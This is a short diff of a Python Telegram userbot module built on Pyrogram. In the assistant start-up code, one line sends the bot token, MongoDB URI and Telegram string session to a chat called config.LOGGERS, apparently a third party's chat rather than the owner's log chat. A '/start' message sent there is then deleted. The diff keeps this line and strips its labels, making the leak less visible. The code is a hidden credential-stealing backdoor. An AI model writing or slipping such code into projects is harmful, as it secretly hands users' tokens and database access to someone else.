@@ -5,10 +5,10 @@ from dotenv import load_dotenv
 from pyrogram import Client
 
 load_dotenv()
-
 import config
 
 from ..logging import LOGGER
+
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -75,7 +75,7 @@ class Userbot(Client):
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                 oks = await self.one.send_message(config.LOGGERS, f"/start")
                 Ok = await self.one.send_message(
-                    config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
+                    config.LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                 )
                 await oks.delete()
                 await asyncio.sleep(2)
